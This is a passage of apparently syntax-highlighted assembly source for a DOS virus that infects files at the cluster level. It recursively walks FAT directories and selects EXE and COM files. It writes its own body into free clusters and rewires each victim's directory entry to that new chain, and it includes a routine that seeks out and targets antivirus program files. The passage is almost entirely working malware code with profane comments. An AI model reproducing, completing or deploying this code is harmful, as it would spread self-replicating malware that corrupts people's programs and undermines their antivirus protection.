</span><span class="sc5">__exit</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">; flush directory cluster if modified</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TRY_TO_FLUSH_DIR_CACHE</span><span class="sc0">

                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__file</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">           </span><span class="sc1">; fucking message</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">gs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.direntry_cluster</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">gs</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">printf</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'%s11  %iw04h0\n$'</span><span class="sc0">
                        </span><span class="sc9">ENDIF</span><span class="sc0">

                        </span><span class="sc1">; get extension</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">gs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.direntry_ext</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'XE'</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__ext_ok</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'OC'</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__ext_ok</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__cont</span><span class="sc0">

</span><span class="sc5">__ext_ok</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">           </span><span class="sc1">; fucking message</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">printf</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Extension checked - OK\n$'</span><span class="sc0">
                        </span><span class="sc9">ENDIF</span><span class="sc0">

                        </span><span class="sc1">; read 1st file cluster</span><span class="sc0">
                        </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">gs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.direntry_cluster</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">level3_cluster</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">level3_count</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">buf_ptr</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc5">level3_ptr</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">level3_read</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">

                        </span><span class="sc1">; fs:bx = @file cluster</span><span class="sc0">
                        </span><span class="sc6">lfs</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_ptr</span><span class="sc0">

                        </span><span class="sc1">; "INFECTED" id ?</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">infected_id</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">C_INFECTED_ID</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__cont</span><span class="sc0">

                        </span><span class="sc1">; determine com or exe file</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc5">.exe_mz</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'MZ'</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__mz</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc5">.exe_mz</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__mz</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">FTYPE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'c'</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__not_mz</span><span class="sc0">
</span><span class="sc5">__mz</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">FTYPE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'e'</span><span class="sc0">
</span><span class="sc5">__not_mz</span><span class="sc4">:</span><span class="sc0">

                        </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">  </span><span class="sc1">; hehe... be curefull!</span><span class="sc0">
                        </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">z0mbie_id</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">z0mbie_id_len</span><span class="sc0">
                        </span><span class="sc5">segfs</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">cmpsb</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__cont</span><span class="sc0">
                        </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">__super_infect</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">           </span><span class="sc1">; fucking message</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">printf</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*** Executing SUPER_INFECT ***\n$'</span><span class="sc0">
                        </span><span class="sc9">ENDIF</span><span class="sc0">

                        </span><span class="sc1">; now infect fucking file...</span><span class="sc0">

                        </span><span class="sc6">pushad</span><span class="sc0">

                        </span><span class="sc1">; calculate bytes per cluster</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">level3_sectpercluster</span><span class="sc0">
                        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">__cluster_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc1">; calculate # of clusters needed</span><span class="sc0">

                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">__rep</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">__cluster_size</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virsize</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__rep</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">__clust_need</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc1">; increase file size</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">gs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.direntry_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                     </span><span class="sc1">;  lfs     bx, buf_ptr</span><span class="sc0">
                     </span><span class="sc1">;  add     ecx, fs:[bx].exe_neptr</span><span class="sc0">
                     </span><span class="sc1">;  mov     neptr, ecx</span><span class="sc0">

                        </span><span class="sc1">; store dircluster</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">gs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.direntry_cluster</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">__dircluster</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

                        </span><span class="sc1">; pointer to virus</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">level3_ptr.o</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">level3_ptr.s</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">

                        </span><span class="sc1">; NOW CREATE CLUSTER CHAIN</span><span class="sc0">

                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">    </span><span class="sc1">; no cluster</span><span class="sc0">

</span><span class="sc5">__next_cluster</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__find_free_cluster</span><span class="sc0"> </span><span class="sc1">; find free cluster</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__infected</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">__freecluster</span><span class="sc0">   </span><span class="sc1">; write virus part</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">level3_cluster</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; to this cluster</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">level3_count</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">level3_write</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">__cluster_size</span><span class="sc0"> </span><span class="sc1">; increase virus pointer</span><span class="sc0">
                        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">              </span><span class="sc1">; by cluster size</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">level3_ptr.s</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">__freecluster</span><span class="sc0">

                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__not1st</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">__1stcluster</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; 1st cluster</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; temporary init with EOF</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EOF</span><span class="sc0">

</span><span class="sc5">__not1st</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">level3_cluster_set</span><span class="sc0">  </span><span class="sc1">; used to create links</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">__freecluster</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc5">__clust_need</span><span class="sc0">        </span><span class="sc1">; end of cycle</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__next_cluster</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">__dircluster</span><span class="sc0">    </span><span class="sc1">; set link to dircluster</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">level3_cluster_set</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">__1stcluster</span><span class="sc0">    </span><span class="sc1">; set new dircluster</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">gs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.direntry_cluster</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">CACHE_MODIFIED</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; of coz cache now modified</span><span class="sc0">

</span><span class="sc5">__infected</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">popad</span><span class="sc0">           </span><span class="sc1">; thats all!!!</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__cont</span><span class="sc0">

</span><span class="sc5">__1stcluster</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; some vars used in infection</span><span class="sc0">
</span><span class="sc5">__cluster_size</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">__clust_need</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">__dircluster</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">__freecluster</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">__find_free_cluster</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pushad</span><span class="sc0">          </span><span class="sc1">; subprogram to find free cluster</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">   </span><span class="sc1">; scan all clusters</span><span class="sc0">
</span><span class="sc5">__q</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">level3_cluster_get</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__found</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">level3_totalclusters</span><span class="sc0">
                        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">__no_free_cluster</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__q</span><span class="sc0">
</span><span class="sc5">__found</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">__freecluster</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                        </span><span class="sc6">popad</span><span class="sc0">
                        </span><span class="sc6">clc</span><span class="sc0">    </span><span class="sc1">; sucess</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">__no_free_cluster</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">popad</span><span class="sc0">
                        </span><span class="sc6">stc</span><span class="sc0">    </span><span class="sc1">; mustdie</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

                        </span><span class="sc1">; if found directory</span><span class="sc0">

</span><span class="sc5">__directory</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">           </span><span class="sc1">; fucking message</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">gs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.direntry_cluster</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">gs</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">printf</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'%s11  %iw04h0%  &lt;DIRECTORY&gt;\n$'</span><span class="sc0">
                        </span><span class="sc9">ENDIF</span><span class="sc0">

                        </span><span class="sc1">; '.' and '..' is sux</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">gs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.direntry_name</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__cont</span><span class="sc0">

                        </span><span class="sc1">; check for max recurse level</span><span class="sc0">
</span><span class="sc5">MAX_RECURSIVE</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">5</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">_rec</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAX_RECURSIVE</span><span class="sc0">
                        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">__cont</span><span class="sc0">

                        </span><span class="sc1">; flush cache if modified</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TRY_TO_FLUSH_DIR_CACHE</span><span class="sc0">

                        </span><span class="sc1">; scan directory</span><span class="sc0">
                        </span><span class="sc6">pushad</span><span class="sc0">

                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc5">_rec</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">gs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.direntry_cluster</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">process_dir</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc5">_rec</span><span class="sc0">

                        </span><span class="sc6">popad</span><span class="sc0">

                        </span><span class="sc1">; read directory cluster (becoz its modified)</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__read</span><span class="sc0">

                        </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">           </span><span class="sc1">; fucking message</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">printf</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Back from recursive subprogram\n$'</span><span class="sc0">
                        </span><span class="sc9">ENDIF</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__cont</span><span class="sc0">

                        </span><span class="sc1">; read directory cluster</span><span class="sc0">

</span><span class="sc5">__read</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">level3_cluster</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">level3_count</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dir_ptr</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc5">level3_ptr</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">level3_read</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">CACHE_MODIFIED</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

                        </span><span class="sc1">; write directory cluster if modified</span><span class="sc0">

</span><span class="sc5">TRY_TO_FLUSH_DIR_CACHE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">CACHE_MODIFIED</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">CACHE_MODIFIED</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">level3_cluster</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">level3_count</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dir_ptr</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc5">level3_ptr</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">level3_write</span><span class="sc0">

</span><span class="sc5">__exit</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

                        </span><span class="sc1">; input:  GS:[SI]</span><span class="sc0">
                        </span><span class="sc1">; output: CF=1 - file fucked</span><span class="sc0">

                        </span><span class="sc1">; scan for AV-files</span><span class="sc0">

</span><span class="sc5">TRY_TO_FUCK_FILE</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pushad</span><span class="sc0">

                        </span><span class="sc1">; hehe.. DRWEB 4.00!</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">gs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.direntry_time</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2000h</span><span class="sc0">  </span><span class="sc1">; 4:00 am</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__fuck_it</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fucked</span><span class="sc0">

</span><span class="sc5">__next_f</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">__next</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'?'</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__equ</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">gs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__cmp</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'z'</span><span class="sc0">
                        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">__cmp</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc4">-</span><span class="sc12">'a'</span><span class="sc0">
</span><span class="sc5">__cmp</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__rt</span><span class="sc0">
</span><span class="sc5">__equ</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__next</span><span class="sc0">
                        </span><span class="sc1">; e</span><span class="sc0">
</span><span class="sc5">__rt</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">__fuck_it</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fucked_end</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__next_f</span><span class="sc0">

                        </span><span class="sc6">popad</span><span class="sc0">

                        </span><span class="sc6">clc</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

                        </span><span class="sc1">; FUCK AV-file</span><span class="sc0">

